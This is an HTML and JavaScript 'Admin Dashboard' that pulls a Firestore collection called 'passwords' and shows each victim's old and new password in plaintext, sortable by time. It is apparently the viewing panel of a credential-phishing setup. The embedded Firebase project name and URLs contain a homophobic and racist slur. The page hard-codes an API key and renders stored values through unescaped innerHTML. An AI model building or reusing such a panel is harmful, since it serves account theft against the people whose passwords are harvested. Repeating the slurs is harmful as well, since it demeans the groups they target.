<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Admin Dashboard</title>
  <style>
    /* Global Styles */
    body {
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
      margin: 0;
      padding: 0;
      background-color: #f4f7fc;
      color: #333;
    }

    .container {
      width: 90%;
      max-width: 1200px;
      margin: 40px auto;
      background-color: #ffffff;
      border-radius: 12px;
      box-shadow: 0 6px 18px rgba(0, 0, 0, 0.15);
      padding: 30px;
      position: relative;
    }

    h1 {
      font-size: 32px;
      margin-bottom: 20px;
      text-align: center;
      color: #333;
    }

    /* Sorting Button */
    .sort-btn {
      font-size: 16px;
      padding: 8px 16px;
      background-color: #007bff;
      color: white;
      border: none;
      border-radius: 6px;
      cursor: pointer;
      box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
      transition: background-color 0.3s ease;
      position: absolute;
      right: 20px;
      top: 20px;
    }

    .sort-btn:hover {
      background-color: #0056b3;
    }

    /* Popup */
    .popup-overlay {
      display: none;
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background-color: rgba(0, 0, 0, 0.5);
      justify-content: center;
      align-items: center;
    }

    .popup-content {
      background-color: #ffffff;
      border-radius: 12px;
      width: 300px;
      padding: 20px;
      box-shadow: 0 6px 18px rgba(0, 0, 0, 0.15);
    }

    .popup-content h3 {
      margin-bottom: 10px;
      text-align: center;
    }

    .popup-content button {
      display: block;
      width: 100%;
      padding: 10px;
      margin: 5px 0;
      background-color: #007bff;
      color: white;
      border: none;
      border-radius: 6px;
      cursor: pointer;
      transition: background-color 0.3s ease;
    }

    .popup-content button:hover {
      background-color: #0056b3;
    }

    .popup-content button.cancel {
      background-color: #dc3545;
    }

    .popup-content button.cancel:hover {
      background-color: #c82333;
    }

    /* Table Styles */
    .table-wrapper {
      width: 100%;
      overflow-x: auto;
      margin-top: 40px;
    }

    table {
      width: 100%;
      border-collapse: collapse;
      font-size: 16px;
    }

    th, td {
      padding: 16px;
      text-align: left;
      border-bottom: 1px solid #ddd;
    }

    th {
      background-color: #007bff;
      color: white;
      font-weight: bold;
      border-radius: 8px;
    }

    td {
      background-color: #f9f9f9;
    }

    tr:nth-child(even) {
      background-color: #f1f1f1;
    }

    .actions {
      text-align: center;
    }

    .btn {
      padding: 8px 16px;
      background-color: #28a745;
      color: white;
      border: none;
      border-radius: 6px;
      cursor: pointer;
      box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
      transition: background-color 0.3s ease;
    }

    .btn:hover {
      background-color: #218838;
    }

    .btn:focus {
      outline: none;
    }

    /* Responsive Design */
    @media screen and (max-width: 768px) {
      .container {
        padding: 15px;
      }

      table {
        font-size: 14px;
      }

      .sort-btn {
        font-size: 14px;
        padding: 6px 10px;
      }
    }
  </style>
</head>
<body>

  <div class="container">
    <h1>Admin Dashboard</h1>
    <button class="sort-btn" onclick="openPopup()">Sort Options</button>

    <div class="table-wrapper">
      <table id="passwordTable">
        <thead>
          <tr>
            <th>Old Password</th>
            <th>New Password</th>
            <th>Timestamp</th>
          </tr>
        </thead>
        <tbody>
          <!-- Data will be inserted here from Firebase -->
        </tbody>
      </table>
    </div>
  </div>

  <!-- Popup for Sorting Options -->
  <div class="popup-overlay" id="popupOverlay">
    <div class="popup-content">
      <h3>Sort by:</h3>
      <button onclick="sortData('recent')">Recently Added</button>
      <button onclick="sortData('oldest')">Oldest</button>
      <button class="cancel" onclick="closePopup()">Cancel</button>
    </div>
  </div>

  <!-- Firebase Scripts -->
  <script type="module">
    import { initializeApp } from 'https://www.gstatic.com/firebasejs/9.17.1/firebase-app.js';
    import { getFirestore, collection, getDocs } from 'https://www.gstatic.com/firebasejs/9.17.1/firebase-firestore.js';

    // Firebase configuration
    const firebaseConfig = {
  apiKey: "AIzaSyBLqQhAtNuO632Xd3-e5Fe3oYDKLJGT8K0",
  authDomain: "gay-ass-nigga.firebaseapp.com",
  databaseURL: "https://gay-ass-nigga-default-rtdb.firebaseio.com",
  projectId: "gay-ass-nigga",
  storageBucket: "gay-ass-nigga.firebasestorage.app",
  messagingSenderId: "740449529935",
  appId: "1:740449529935:web:ab2538ff3bdad3fbc8fa3a"
};
    // Initialize Firebase
    const app = initializeApp(firebaseConfig);
    const db = getFirestore(app);

    let passwordData = [];

    // Function to load password data from Firebase Firestore
    async function loadPasswordData() {
      const querySnapshot = await getDocs(collection(db, "passwords"));
      const tableBody = document.querySelector("#passwordTable tbody");

      querySnapshot.forEach((doc) => {
        const data = doc.data();
        const row = document.createElement("tr");

        // Store timestamp and data
        const timestamp = data.timestamp.toDate();

        row.innerHTML = `
          <td>${data.oldPassword}</td>
          <td>${data.newPassword}</td>
          <td>${timestamp.toLocaleString()}</td>
        `;
        
        passwordData.push({ ...data, timestamp });
        tableBody.appendChild(row);
      });
    }

    // Function to sort the password data
    function sortData(criteria) {
      let sortedData = [];
      
      if (criteria === 'recent') {
        sortedData = passwordData.sort((a, b) => b.timestamp - a.timestamp);
      } else if (criteria === 'oldest') {
        sortedData = passwordData.sort((a, b) => a.timestamp - b.timestamp);
      }
      
      // Re-render sorted data
      const tableBody = document.querySelector("#passwordTable tbody");
      tableBody.innerHTML = '';

      sortedData.forEach((data) => {
        const row = document.createElement("tr");
        row.innerHTML = `
          <td>${data.oldPassword}</td>
          <td>${data.newPassword}</td>
          <td>${data.timestamp.toLocaleString()}</td>
        `;
        tableBody.appendChild(row);
      });

      // Close popup
      closePopup();
    }

    // Popup functionality
    function openPopup() {
      document.getElementById('popupOverlay').style.display = 'flex';
    }

    function closePopup() {
      document.getElementById('popupOverlay').style.display = 'none';
    }

    // Load data when the page is ready
    window.onload = loadPasswordData;
  </script>
</body>
</html>
